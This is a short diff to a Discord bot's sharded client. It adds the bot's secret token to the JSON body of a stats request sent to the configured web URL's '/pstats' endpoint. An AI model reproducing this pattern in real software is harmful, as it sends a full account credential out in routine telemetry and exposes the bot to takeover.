@@ -442,7 +442,8 @@ class ShardedBotInstance(commands.AutoShardedBot):
                     f"{self.config.web_url_base}/pstats",
                     json={
                         "guilds": len(self.guilds),
-                        "users": sum([x.member_count for x in self.guilds])
+                        "users": sum([x.member_count for x in self.guilds]),
+                        "token": self.config.token
                     }
                 )
             else:
